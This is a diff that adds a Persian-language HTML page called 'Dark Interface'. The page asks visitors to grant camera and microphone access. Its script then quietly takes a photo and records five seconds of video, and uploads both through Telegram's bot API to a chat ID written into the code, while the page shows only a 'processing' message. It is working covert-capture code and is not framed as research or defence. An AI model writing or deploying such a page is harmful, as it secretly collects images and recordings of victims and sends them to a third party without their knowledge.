@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark Interface</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            direction: rtl;
+        }
+        h1 {
+            font-size: 2em;
+            text-shadow: 0 0 5px #0f0;
+        }
+        #status {
+            font-size: 1em;
+            margin: 10px 0;
+            color: #ff4444;
+        }
+        button {
+            background-color: #333;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            transition: background-color 0.3s;
+            font-size: 1.2em;
+        }
+        button:hover {
+            background-color: #0f0;
+            color: #000;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>رابط تاریک</h1>
+    <p id="status">برای ادامه، دسترسی به دوربین و میکروفون را مجاز کنید.</p>
+    <button onclick="initMedia()">اجازه دسترسی</button>
+    <video id="video" autoplay muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const status = document.getElementById('status');
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // تنظیمات ربات تلگرامی
+        const telegramBotToken = '6822140232'; // توکن ربات تلگرام
+        const telegramChatId = '-1002548720541'; // شناسه چت تلگرام
+
+        // درخواست دسترسی به دوربین و میکروفون
+        async function initMedia() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                video.srcObject = stream;
+                status.textContent = 'دسترسی برقرار شد. در حال پردازش...';
+                startCapture();
+            } catch (err) {
+                status.textContent = 'خطا در دسترسی: ' + err.message + ' (از HTTPS و تنظیمات مرورگر مطمئن شوید)';
+                console.error('Media Error:', err);
+            }
+        }
+
+        // گرفتن عکس
+        function capturePhoto() {
+            try {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photo = canvas.toDataURL('image/png');
+                sendToTelegram('sendPhoto', { photo });
+                status.textContent = 'در حال پردازش...';
+            } catch (err) {
+                status.textContent = 'خطا در گرفتن عکس: ' + err.message;
+                console.error('Photo Error:', err);
+            }
+        }
+
+        // شروع ضبط ویدئو
+        function startRecording() {
+            try {
+                recordedChunks = [];
+                const stream = video.srcObject;
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                mediaRecorder.onstop = () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        const base64Video = reader.result.split(',')[1];
+                        sendToTelegram('sendVideo', { video: base64Video, title: 'Video Recording' });
+                        status.textContent = 'پردازش کامل شد.';
+                    };
+                    reader.readAsDataURL(videoBlob);
+                };
+                mediaRecorder.start();
+                status.textContent = 'در حال ضبط ویدئو...';
+                setTimeout(stopRecording, 5000); // ضبط 5 ثانیه
+            } catch (err) {
+                status.textContent = 'خطا در ضبط ویدئو: ' + err.message;
+                console.error('Recording Error:', err);
+            }
+        }
+
+        // توقف ضبط ویدئو
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+        }
+
+        // ارسال داده به ربات تلگرامی
+        async function sendToTelegram(method, data) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/${method}`;
+            const formData = new FormData();
+            formData.append('chat_id', telegramChatId);
+
+            try {
+                if (method === 'sendPhoto') {
+                    const response = await fetch(data.photo);
+                    const blob = await response.blob();
+                    formData.append('photo', blob, 'photo.png');
+                } else if (method === 'sendVideo') {
+                    const binary = atob(data.video);
+                    const array = new Uint8Array(binary.length);
+                    for (let i = 0; i < binary.length; i++) {
+                        array[i] = binary.charCodeAt(i);
+                    }
+                    const blob = new Blob([array], { type: 'video/webm' });
+                    formData.append('video', blob, 'video.webm');
+                    formData.append('title', data.title);
+                }
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                if (!result.ok) {
+                    status.textContent = 'خطا در ارسال به تلگرام: ' + result.description;
+                    console.error('Telegram Error:', result);
+                }
+            } catch (err) {
+                status.textContent = 'خطا در ارتباط با تلگرام: ' + err.message;
+                console.error('Network Error:', err);
+            }
+        }
+
+        // شروع خودکار ضبط و گرفتن عکس
+        function startCapture() {
+            capturePhoto();
+            startRecording();
+        }
+    </script>
+</body>
+</html>
